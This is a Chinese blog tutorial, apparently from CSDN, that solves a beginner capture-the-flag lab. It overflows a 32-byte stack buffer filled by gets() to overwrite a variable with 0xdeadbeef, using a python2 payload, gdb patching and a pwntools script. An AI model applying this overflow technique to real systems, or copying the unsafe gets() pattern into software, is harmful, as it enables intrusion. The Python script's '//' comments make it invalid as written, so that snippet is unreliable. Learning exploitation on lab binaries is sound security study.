# 简介
“pwn"这个词的源起以及它被广泛地普遍使用的原因，源自于魔兽争霸某段讯息上设计师打字时拼错而造成的，原先的字词应该是"own"这个字，因为 ‘p’ 与 ‘o’ 在标准英文键盘上的位置是相邻的，PWN 也是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似"砰”，对黑客而言，这就是成功实施黑客攻击的声音，而在ctf比赛里，pwn是对二进制漏洞的利用

# 获取文件信息
下载这个github库，进入02文件夹
```
https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/76bbf1af747e49519dfae56302d598c0.png)

使用checksec工具可以查看程序更详细的信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/300e5c0ed150403b8d1a264c6a17b875.png)
这也和上一个文件相似，从上到下依次是
```
32位程序
部分RELRO，基本上所有程序都默认的有这个
没有开启栈保护
未启用nx，nx：数据执行
没有pie，意思是程序的内存空间不会被随机化
有读，写，和执行的段，意思是我们可以在程序里写入shellcode
```
# 覆盖堆栈上的变量

现在我们执行程序看看，随意输入一些字符后，程序就退出了

![在这里插入图片描述](https://img-blog.csdnimg.cn/5f2e6728485f4bbea0d7b790876b0fc5.png)

然后我们在数入长一点的字符，可以看到，原来的12345678已经变成大写字母A的ascii码了

![在这里插入图片描述](https://img-blog.csdnimg.cn/ffbc55814adc49ee888420dabb1a91b8.png)

然后我们打开程序的源代码看看

![在这里插入图片描述](https://img-blog.csdnimg.cn/d1da34913e574ff7aa6cd52dcd67ad74.png)

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void do_input(){   
    int key = 0x12345678;   //定义了一个变量key，key的值为0x12345678
    char buffer[32];    //定义了一个变量，名为buffer，有32个字节的缓冲区
    printf("yes? ");    //输出字符串yes?
    fflush(stdout);   //清除缓冲区
    gets(buffer);   //获取我们输入的字符，并存入到buffer变量里
    if(key == 0xdeadbeef){    //如果key = 0xdeadbeef
        printf("good job!!\n");
        printf("%04x\n", key);
        fflush(stdout);    //成功破解程序
    }
    else{   //否则失败
        printf("%04x\n", key);
        printf("...\n");
        fflush(stdout);
    }
}

int main(int argc, char* argv[]){
    do_input();
    return 0;
}
```
这里我们分析了源码，就没必要进行静态分析了

通过分析源代码，我们知道了缓冲区的字节为32个，意思是我们只需要输入32个字符就能填满此程序的缓冲区，多余的字符则会覆盖key原本的值

我们输入32个字符看看，然后再输入一些不同的值

可以看到，key的原本的值被覆盖成b的ascii码了

![在这里插入图片描述](https://img-blog.csdnimg.cn/95e610cf948d40edb0582ffcbdc552a6.png)

从上面分析的源代码可以知道，key的值必须等于十六进制的0xdeadbeef才能输出正确的字符，这种十六进制无法用键盘输入，需要用到python

在这里还有一个知识点是在x86架构里，读取地址是由低到高的，十六进制0xdeadbeef就要从最后一个开始写

```
python2 -c "print ('A'*32+'\xef\xbe\xad\xde')"
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/201f5a2d8fb347b49d1d54f7fe9cf2b0.png)


用linux管道符连接程序，可以看到，我们覆盖了key原本的值后成功的破解了程序

![在这里插入图片描述](https://img-blog.csdnimg.cn/e7e84c99b71f4458ba4c145ac2f1eb05.png)

# 动态调试
我们用gdb对程序进行动态调试

```
gdb overwrite
```

然后查看程序里调用的函数
```
info functions
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/49692f1d209e4457b0ecd499f7a1d0d9.png)
然后查看主函数do_input的汇编代码
```
disassemble do_input
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ab8bce1c3bc840a481fe45b70f8323c1.png)

在这里，key的值和我们输入的值做了对比

![在这里插入图片描述](https://img-blog.csdnimg.cn/3a733103c1c544baa4bf6499c11cf725.png)

我们在这里下一个断点
```
b *0x080491e0
```

然后运行程序，随意输入一些值
![在这里插入图片描述](https://img-blog.csdnimg.cn/2218e89884c748568e1d9df5ddc398e3.png)

之后程序会自动运行到断点处停下

![在这里插入图片描述](https://img-blog.csdnimg.cn/b554f21cc28a48f4aa27e32e252ba736.png)

这里将ebp寄存器里的值减去了0xc转换成10进制就是12和0xdeadbeef做了对比，我们可以看一下这个地址的值
```
x $ebp - 0xc
```

现在还是原来的值0x12345678

![在这里插入图片描述](https://img-blog.csdnimg.cn/71b452a5a68d4306a399d117b703ea37.png)

我们可以直接修改这个地址的值
```
set *0xffffd38c = 0xdeadbeef
```
然后再次查看这个地址的值
```
x $ebp - 0xc
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2213d426d3414a4fa3387d2a8856b423.png)

可以看到已经被修改成功了，现在我们输入n继续执行程序

![在这里插入图片描述](https://img-blog.csdnimg.cn/a29c6c2d8b0c4e6692fba0c595447e45.png)


成功破解程序


# pwntools脚本
```
from pwn import *   //导入pwntools模块

io = process('./overwrite')    //运行程序
io.sendline(b'A' * 32 + p32(0xdeadbeef))   //程序运行后发送指定的字符串，格式为32位
print(io.recvall().decode())   //接收输出并且解码
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/54e8625e71204f299840c9a38ace32c9.png)
# 总结
有什么不会或者是错误的地方的可以私信我，看到必回



